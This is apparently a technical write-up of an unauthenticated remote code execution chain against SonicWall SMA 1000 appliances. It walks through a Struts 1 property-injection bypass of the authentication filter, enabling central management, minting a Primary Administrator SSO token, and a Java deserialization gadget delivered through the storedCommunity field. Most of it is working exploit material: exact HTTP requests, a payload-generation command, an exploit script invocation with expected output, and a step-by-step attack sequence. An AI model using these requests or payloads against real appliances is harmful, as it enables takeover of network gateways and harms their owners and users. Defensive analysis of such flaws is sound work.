# SonicWall SMA 1000 Pre-Auth Deserialization RCE Chain - Technical Analysis

## Overview

This vulnerability chain combines a Struts 1 class-level property-injection flaw with a Java deserialization sink to achieve unauthenticated remote code execution on SonicWall SMA 1000 series appliances. An attacker first abuses the default `multipartRequestHandler` property exposed on every Struts 1 `ActionForm` to traverse the bean graph and rewrite the Jetty security filter's path mappings, removing authentication from the `/Console` REST API and the management console. With the console unauthenticated, the attacker enables the Central Management Service, mints a Single Sign-On token as the Primary Administrator, and exchanges it for an administrator `JSESSIONID`. That session is then used to submit a serialized `BeanComparator` + `TemplatesImpl` gadget through the `storedCommunity` field of `/configUserCommunityEPC.do`, whose setter deserializes the value and executes an arbitrary operating system command as the `mgmt-server` user (uid=1011, gid=500 aventail). The entire chain requires no credentials and no prior knowledge of the appliance beyond its address.

## Authentication Boundary

The SMA management plane is a Jetty server (`Apache/2.4.53` fronting a Jetty servlet context, `Server: SMA/12.4`) hosting two surfaces:

- **`/Console`** — a REST API (`com.aventail.mgmt.console`) for central management, administrators, users, snapshots, and pending changes.
- **`/console` + `*.do`** — the legacy Struts 1 management console (`com.aventail.mgmt.struts`), including `login.do`, `configUserCommunityEPC.do`, and the SSO login servlet.

A Jetty `SecurityHandler` enforces authentication through a set of `filterMappings`. The console Struts actions and the `/Console` REST endpoints are protected by these filter mappings. The chain's first stage does not defeat the authentication logic itself — it rewrites **which paths the authentication filter covers**, shrinking the protected surface to a non-existent path so that the real endpoints become reachable without credentials.

The management process runs as:

```
mgmt-server  /usr/local/app/mgmt-server/bin/AMC  ... com.aventail.mgmt.startup.CommandStartup conf/amcconfig.xml
```

The web tier is built on **Struts 1** (the legacy Apache framework) and **commons-beanutils** property binding, which is the foundation for the property-injection primitive used in Stage 1.

## Stage 1: Pre-Auth Filter Bypass via `multipartRequestHandler` Property Injection

### The Struts 1 class-level flaw (CVE-2014-0114 class)

Every Struts 1 `ActionForm` exposes a default property descriptor named `multipartRequestHandler`:

```
PropertyDescriptor[name=multipartRequestHandler;
  propertyType=interface org.apache.struts.upload.MultipartRequestHandler;
  readMethod=public MultipartRequestHandler ActionForm.getMultipartRequestHandler();
  writeMethod=public void ActionForm.setMultipartRequestHandler(MultipartRequestHandler)]
```

`com.aventail.mgmt.struts.RequestProcessor#populate` populates the action form from request parameters by delegating to `org.apache.commons.beanutils.PropertyUtilsBean#setProperty`, which interprets a dotted/indexed parameter name as a bean property path and walks it by invoking getters (and setters at the leaf). Because `multipartRequestHandler` is a real, non-excluded property, the traversal does not stop at the form — it continues into the servlet container:

```
ActionForm
  └─ multipartRequestHandler   (CommonsMultipartRequestHandler)
       └─ servlet              (ActionServlet)
            └─ servletContext  (Jetty ServletContext / ContextHandler)
                 └─ contextHandler
                      └─ servletHandler
                           └─ filterMappings[1].pathSpecs   ← writable leaf
                           └─ filterChainsCached            ← writable leaf
```

The appliance applies a security denylist regex intended to block class-loader traversal:

```
(.*\.|^|.*|\[('|"))(c|C)lass(\.|('|")]|\[).*
```

This blocks `class` and `classLoader` path segments, but the `multipartRequestHandler → servlet → servletContext → contextHandler → servletHandler` path contains none of those tokens, so it is **not** blocked. The `ServletContext` (and through it the Jetty `ServletHandler` and its `filterMappings`) is therefore reachable from an unauthenticated request.

### Filter rewrite

Two writes are sufficient to disable authentication for the console:

**Write 1 — relocate the auth filter's path spec:**

```
POST /login.do?multipartRequestHandler.servlet.servletContext.contextHandler.servletHandler.filterMappings[1].pathSpecs=/authtest/* HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarywPSLcqLs3OJIPL9X

------WebKitFormBoundarywPSLcqLs3OJIPL9X
Content-Disposition: form-data; name="x"

1
------WebKitFormBoundarywPSLcqLs3OJIPL9X--
```

Setting `filterMappings[1].pathSpecs` to `/authtest/*` makes the authentication filter apply only to the non-existent `/authtest/*` path. Every real path — `/Console/*` and the `*.do` console actions — is left without authentication.

**Write 2 — force the filter cache to rebuild:**

```
POST /login.do?multipartRequestHandler.servlet.servletContext.contextHandler.servletHandler.filterChainsCached=false HTTP/1.1
```

Jetty caches compiled filter chains. Setting `filterChainsCached=false` forces the cache to be rebuilt on the next request so that the rewritten path spec takes effect immediately rather than after a restart.

The request must carry a `multipart/form-data` content type (with a minimal multipart body) because the `multipartRequestHandler` is only instantiated for multipart requests; the property-injection traversal begins from that handler. `/login.do` is a pre-authentication Struts action, so it is reachable before any of these writes take effect.

After Stage 1, `/Console/*` and the console Struts actions are unauthenticated.

## Stage 2: Enable the Central Management Service

The SSO login servlet only issues usable sessions when the Central Management Service is enabled. With `/Console` now unauthenticated, the attacker enables it through the REST API and applies the pending change:

**Write the CMS configuration:**

```
POST /Console/CentralManagement/ManagedSettings HTTP/1.1
Content-Type: application/json

{
  "cmsAddress": "0.0.0.0",
  "enabled": true,
  "externalManagementEnabled": true,
  "oneTimePassword": "root123",
  "registered": true
}
```

A successful write returns `204 No Content`.

**Apply the pending change (with a delayed restart):**

```
POST /Console/PendingChanges/Apply?delayRestart=true&applyAll=true HTTP/1.1
```

`delayRestart=true` schedules the restart so the HTTP channel stays up long enough to complete the remaining stages. A `200` with `restartPending=false`, or a `500` whose body references `PendingChangesResource`, both indicate the change was accepted.

## Stage 3: Unauthenticated SSO Token and Administrator Session

With CMS enabled, the SSO endpoint mints a Primary Administrator token with no credentials:

```
GET /Console/CentralManagement/SSO/Authorize?user=admin&roleUser=Primary+Admin&localAdmin=true HTTP/1.1

HTTP/1.1 200 OK
{ "token" : "6c0232c6-eb7b-4882-b408-4b8566a11493" }
```

The token is short-lived (approximately ten seconds) and must be consumed immediately. It is exchanged for a console session at the SSO login servlet:

```
GET /console/cms/login?token=6c0232c6-eb7b-4882-b408-4b8566a11493&pageId=console HTTP/1.1
```

The response body embeds the session identifier in a JavaScript asset reference:

```
<script src="/javascript/aventail.js?sid=node01deadbeefdeadbeefdeadbeefdead.node0"></script>
```

The `sid` value (the 32-character node session id plus the `.node0` suffix) is a valid administrator `JSESSIONID`. Reusing it as `Cookie: JSESSIONID=<sid>` authenticates subsequent `*.do` console actions as the Primary Administrator. This is the "perfect ending" of the chain: the SSO login flow, with the 302 redirect left to follow, returns the admin session id directly in the response body.

## Stage 4: Java Deserialization RCE via `setStoredCommunity`

### The sink

`/configUserCommunityEPC.do` is a Struts 1 action:

```
ActionConfig[path=/configUserCommunityEPC, validate=false,
  name=userCommunityEPCForm, parameter=epc, scope=request,
  type=com.aventail.mgmt.struts.policy.ConfigUserCommunityAction]
```

The bound form (`userCommunityEPCForm`) extends `com.aventail.mgmt.struts.policy.BaseCommunityForm`, which exposes a `storedCommunity` property with a setter that **deserializes** its argument:

```
BaseCommunityForm.setStoredCommunity(String value):
    byte[] data = base64Decode(value)
    data = gunzip(data)
    ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(data))
    ois.readObject()                       // attacker-controlled gadget graph
```

Because `RequestProcessor#populate` binds request parameters to the form through `PropertyUtilsBean#setProperty`, submitting `storedCommunity` as a multipart form field drives the value straight into the deserializing setter. The request must target a `*.do` URI (the Struts action mapping) to reach the form population step.

### The gadget

The deserialization gadget is a standard `commons-beanutils` + `xalan` chain:

- `PriorityQueue` with a `BeanComparator` (property = `outputProperties`).
- Two `TemplatesImpl` instances holding attacker-built bytecode, placed in the queue's backing array.
- The bytecode is a class extending `org.apache.xalan.xsltc.runtime.AbstractTranslet` whose static initializer runs `Runtime.getRuntime().exec(...)`.

On deserialization, `PriorityQueue.readObject` re-heapifies the queue, invoking `BeanComparator.compare` on the two `TemplatesImpl` elements. `BeanComparator` fetches the `outputProperties` property from each, which calls `TemplatesImpl.getOutputProperties()` → `newTransformer()` → bytecode load → the static initializer executes the attacker's command.

The wire format is **Java serialization → GZIP → Base64**, matching what `setStoredCommunity` decodes.

### Delivery

```
POST /configUserCommunityEPC.do HTTP/1.1
Cookie: JSESSIONID=<admin sid from Stage 3>
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarywPSLcqLs3OJIPL9X

------WebKitFormBoundarywPSLcqLs3OJIPL9X
Content-Disposition: form-data; name="token"

1
------WebKitFormBoundarywPSLcqLs3OJIPL9X
Content-Disposition: form-data; name="storedCommunity"

<H4sIA... base64-gzip serialized gadget ...>
------WebKitFormBoundarywPSLcqLs3OJIPL9X
Content-Disposition: form-data; name="com.aventail.mgmt.struts.console.authenticated"

true
------WebKitFormBoundarywPSLcqLs3OJIPL9X--
```

A successful deserialization returns `302` redirecting to `manageRealms.do`, confirming the form was processed. The command executes synchronously during deserialization as `mgmt-server` (uid=1011, gid=500 aventail).

### Output retrieval

The appliance serves static files from the Jetty webapp's `javascript/` directory without authentication. The gadget command writes its output there (the runtime webapp directory matches `/tmp/jetty-0_0_0_0-8443-console_war-_-any-*/webapp/javascript/`), and the attacker retrieves it with an anonymous GET:

```
GET /javascript/<file>.js HTTP/1.1
```

This converts the deserialization primitive into a full command-execution-with-output channel: write command output to the webroot, read it back over HTTP.

## Stage 5: Dynamic Verification

**Build the deserialization payload for an arbitrary command** (requires `javassist`, `commons-beanutils`, and `xalan` on the classpath):

```bash
javac -cp "javassist.jar:commons-beanutils.jar:commons-logging.jar:xalan.jar" GenPayload.java
java -cp ".:javassist.jar:commons-beanutils.jar:commons-logging.jar:xalan.jar" \
  GenPayload "for d in /tmp/jetty-0_0_0_0*/; do id > \${d}webapp/javascript/pwned.js; done" \
  > payload.b64
```

**Run the full chain:**

```bash
python3 sonicwall_sma_preauth_rce.py -t https://<target>:8443 \
  -p payload.b64 -r /javascript/pwned.js
```

**Expected script output:**

```
[*] Target: https://<target>:8443
[*] Stage 1: filter bypass via multipartRequestHandler property injection
[+] Filter mappings rewritten, filter cache disabled
[*] Stage 2: enable Central Management Service
[+] CMS enabled, pending changes applied
[*] Stage 3: SSO token + admin session
[+] SSO token: 6c0232c6-eb7b-4882-b408-4b8566a11493
[+] Admin JSESSIONID: node01deadbeefdeadbeefdeadbeefdead.node0
[*] Stage 4: deliver deserialization payload
[+] Deserialization triggered (302 -> manageRealms)
[*] Retrieving output: /javascript/pwned.js
[+] HTTP 200
uid=1011(mgmt-server) gid=500(aventail) groups=500(aventail)
```

**HTTP evidence per stage:**

- Stage 1: `POST /login.do?...filterMappings[1].pathSpecs=/authtest/*` → `200`; `...filterChainsCached=false` → `200`.
- Stage 2: `POST /Console/CentralManagement/ManagedSettings` → `204`; `POST /Console/PendingChanges/Apply` → `200`/`500(PendingChangesResource)`.
- Stage 3: `GET /Console/.../SSO/Authorize` → `200 {"token":...}`; `GET /console/cms/login?token=...` → `200` body containing `aventail.js?sid=<admin>.node0`.
- Stage 4: `POST /configUserCommunityEPC.do` → `302 Location: .../manageRealms.do`.
- Retrieval: `GET /javascript/<file>.js` → `200`, body = command output.

**Execution identity**: `uid=1011(mgmt-server) gid=500(aventail) groups=500(aventail)` — the management server process, confirming the command ran inside the target appliance and not on the attacker side.

## Complete Attack Sequence

1. **Rewrite the auth filter** — POST to `/login.do` with `multipartRequestHandler...filterMappings[1].pathSpecs=/authtest/*` to shrink the protected surface, and `...filterChainsCached=false` to rebuild the filter cache.
2. **Enable CMS** — POST `/Console/CentralManagement/ManagedSettings` to enable central management, then `/Console/PendingChanges/Apply?delayRestart=true&applyAll=true` to apply.
3. **Mint an admin token** — GET `/Console/CentralManagement/SSO/Authorize?user=admin&roleUser=Primary+Admin&localAdmin=true` for a short-lived SSO token.
4. **Exchange for a session** — GET `/console/cms/login?token=<token>&pageId=console` and extract the admin `JSESSIONID` from the `aventail.js?sid=` reference.
5. **Deliver the gadget** — POST `/configUserCommunityEPC.do` with the admin session and a base64-gzip serialized `BeanComparator`/`TemplatesImpl` gadget in `storedCommunity`; the setter deserializes it and the command runs as `mgmt-server`.
6. **Retrieve output** — GET the webroot static file the command wrote (`/javascript/<file>.js`) to read command output with no authentication.
